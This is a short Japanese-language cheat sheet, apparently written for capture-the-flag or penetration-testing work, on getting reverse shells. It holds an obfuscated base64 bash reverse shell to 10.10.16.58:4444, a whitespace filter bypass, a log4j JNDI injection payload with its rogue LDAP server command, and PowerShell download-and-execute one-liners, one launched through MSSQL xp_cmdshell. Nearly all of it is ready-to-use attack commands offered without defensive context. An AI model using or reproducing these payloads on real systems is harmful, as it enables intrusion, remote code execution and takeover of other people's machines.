# Reverse Shell
Reverse Shellに関するナレッジ

## 全般

### コマンド生成
以下サイトでReverse Shellを貼るコマンドを生成できる
https://www.revshells.com/

### 文字制限Bypass
* 入力値に空白を使用できない場合、$IFS$9で代用できる

https://www.ctfnote.com/web/os-command-injection/whitespace-bypass

* 直接コマンドを送って通らない場合、base64で送ってデコードしたものを実行することで実行可能な場合がある。

```
bash -c {echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41OC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}
```

## サービスごとのシェルと取り方
### Jenkins
JenkinsのScript Consoleが使用可能な場合等は以下のソースでリバースシェルを貼れる

https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

### JNDI-Injection(log4j)
JNDI Injectionが可能な場合、以下のツールを使って任意コマンド実行できる
https://github.com/veracode-research/rogue-jndi

以下のようにLDAP等の通信を受けるサーバを立ち上げる
```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "リバースシェルを貼るコマンド" -A "IP_ADDRESS"
```
JNDI Injectionを起こして立ち上げたサーバにアクセスさせる。
```
${jndi:ldap://10.10.16.58:1389/o=tomcat}
```

### PowerShell
URLで指示した先をコマンドとして解釈する
```
IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.16.58/shell.ps1\")
```

使用例としてはReverseShellを張るためのps1をサーバに設置して、mssqlの
xp_cmdshell等から実行するなど

```
SQL > xp_cmdshell "powershell IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.16.58/shell.ps1\");"
```